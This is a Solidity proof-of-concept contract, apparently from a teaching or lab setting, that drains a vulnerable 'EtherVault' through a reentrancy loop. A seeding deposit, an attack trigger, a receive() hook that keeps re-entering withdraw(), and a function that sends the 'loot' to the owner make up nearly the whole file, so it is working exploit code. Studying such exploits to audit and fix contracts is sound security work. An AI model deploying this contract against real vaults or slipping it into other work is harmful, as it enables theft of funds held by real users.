// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {EtherVault} from "./EtherVault.sol";

/// @title ReentrancyAttacker — Proof-of-Concept exploit contract
/// @notice Drains EtherVault via a classic reentrancy loop.
///
/// Attack anatomy:
/// ┌─────────────────────────────────────────────────────────────┐
/// │  1. Attacker deposits 1 ETH into the vault (looks legit)    │
/// │  2. Attacker calls attack()                                 │
/// │  3. attack() → vault.withdraw()                             │
/// │  4. Vault sends 1 ETH → triggers attacker's receive()       │
/// │  5. receive() calls vault.withdraw() again                  │
/// │     └─ vault still thinks attacker has 1 ETH balance!       │
/// │  6. Loop continues until vault.balance < 1 ETH              │
/// │  7. Final withdraw() call fails the ETH-balance check       │
/// │  8. Loop exits; attacker has drained N × 1 ETH              │
/// └─────────────────────────────────────────────────────────────┘
contract ReentrancyAttacker {
    EtherVault public immutable vault;
    address public immutable owner;
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;

    event AttackLog(uint256 vaultBalance, uint256 attackerBalance, uint256 iteration);

    constructor(address _vault) {
        vault = EtherVault(_vault);
        owner = msg.sender;
    }

    /// @notice Step 1 — fund the attacker contract and deposit into vault
    function seedAttack() external payable {
        require(msg.value >= DEPOSIT_AMOUNT, "Need at least 1 ETH");
        vault.deposit{value: DEPOSIT_AMOUNT}();
    }

    /// @notice Step 2 — trigger the exploit
    function attack() external {
        require(msg.sender == owner, "Only owner");
        require(vault.balances(address(this)) > 0, "Seed first");
        vault.withdraw();
    }

    /// @notice The reentrant hook — called every time vault sends ETH to us
    receive() external payable {
        uint256 vaultBalance = address(vault).balance;
        emit AttackLog(vaultBalance, address(this).balance, block.number);

        // Keep re-entering as long as the vault still has ETH
        if (vaultBalance >= DEPOSIT_AMOUNT) {
            vault.withdraw();
        }
    }

    /// @notice Step 3 — collect stolen funds
    function collectLoot() external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = address(this).balance;
        (bool ok,) = owner.call{value: balance}("");
        require(ok, "Collect failed");
    }

    function attackerBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
